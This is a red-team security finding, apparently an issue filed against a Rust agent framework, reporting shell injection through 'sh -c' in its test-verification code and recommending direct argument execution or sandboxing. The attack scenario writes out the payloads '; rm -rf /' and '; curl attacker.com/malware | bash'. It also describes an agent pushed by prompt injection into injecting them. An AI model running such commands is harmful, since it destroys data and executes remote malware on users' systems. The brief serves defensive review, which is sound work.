---
title: "Arbor HTR Verification Loop Vulnerable to Shell Injection"
labels: ["architecture-review", "adversarial"]
---

# Red Team Architecture Brief

**Finding:**
The methods `evaluate` in `mythrax-core/src/cognitive/arbor.rs` and `executor.rs` construct test commands dynamically based on shell operators (like `|`, `<`, `>`, `;`) and execute them using raw POSIX shell invocations via `Command::new("sh").arg("-c")`.

**Current Assumption:**
Commands generated internally or derived from agent-generated text are safe, well-formed, and strictly bounded to the intended testing worktree.

**Attack Scenario:**
An agent (potentially influenced by prompt injection) or an untrusted external input injects shell metacharacters (e.g., `; rm -rf /` or `; curl attacker.com/malware | bash`) into the test command string. Because the string is passed to `sh -c` unescaped, the shell executes the malicious commands outside the intended scope of the worktree testing sandbox.

**Blast Radius:**
Arbitrary code execution on the host system leading to full system compromise, unauthorized data exfiltration, or destructive actions.

**Recommended Structural Change:**
Eliminate `sh -c` invocations entirely. Always use direct argument execution via `Command::new(program).args(args)` to maintain strict isolation boundaries. If shell operators are genuinely required, use a sandboxed execution environment (e.g., Docker containers or Firecracker microVMs) to execute tests.
